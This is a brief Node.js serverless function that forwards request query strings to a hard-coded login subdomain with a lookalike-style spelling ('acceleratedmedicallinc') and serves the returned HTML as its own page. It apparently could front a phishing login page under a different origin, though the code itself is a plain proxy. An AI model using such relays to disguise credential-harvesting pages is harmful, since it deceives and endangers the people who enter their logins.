const fetch = require("node-fetch");

module.exports = async (req, res) => {
  const BACKEND_URL = "https://login.acceleratedmedicallinc.org"; // Or your real backend

  try {
    const query = new URLSearchParams(req.query).toString();
    const fullUrl = `${BACKEND_URL}?${query}`;
    const response = await fetch(fullUrl);

    const html = await response.text();
    res.setHeader("Content-Type", "text/html");
    res.status(200).send(html);
  } catch (error) {
    console.error("Proxy error:", error);
    res.status(500).send("Server Error");
  }
};
